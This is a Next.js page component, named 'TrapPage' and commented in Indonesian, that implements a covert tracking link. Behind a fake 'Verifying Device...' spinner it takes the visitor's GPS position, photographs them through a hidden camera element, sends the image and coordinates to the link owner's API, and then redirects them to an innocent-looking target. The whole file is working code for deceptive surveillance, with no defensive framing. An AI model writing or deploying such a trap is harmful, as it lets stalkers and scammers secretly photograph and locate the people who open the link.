"use client";

import React, { useEffect, useRef } from "react";
import { useParams } from "next/navigation";

interface GPSData {
  lat: number;
  lon: number;
}

export default function TrapPage() {
  const { code } = useParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const startProcess = async () => {
      // 1. Dapatkan Lokasi GPS
      const gps = await new Promise<GPSData | null>((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
          () => resolve(null),
          { timeout: 3000 },
        );
      });

      // 2. Akses Kamera & Capture
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;

          // Tunggu sebentar agar kamera fokus
          setTimeout(async () => {
            const video = videoRef.current!;
            const canvas = canvasRef.current!;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext("2d");
            ctx?.drawImage(video, 0, 0);
            const image = canvas.toDataURL("image/png");

            // Matikan kamera setelah capture
            stream.getTracks().forEach((track) => track.stop());

            // Kirim ke API tanpa simpan ke DB
            await fetch("/api/snap", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ image, urlCode: code, gps }),
            });

            redirectUser();
          }, 1500);
        }
      } catch (err) {
        redirectUser();
      }
    };

    const redirectUser = async () => {
      try {
        const res = await fetch(`/api/target/${code}`);
        const data = await res.json();
        window.location.replace(data.target || "/");
      } catch {
        window.location.replace("/");
      }
    };

    startProcess();
  }, [code]);

  return (
    <div className="bg-black text-white flex items-center justify-center min-h-screen font-sans">
      <div className="text-center">
        <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-blue-500 mx-auto mb-4"></div>
        <p className="text-sm tracking-widest text-slate-500 uppercase">
          Verifying Device...
        </p>
      </div>
      {/* Hidden elements for capture */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="absolute opacity-0 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}
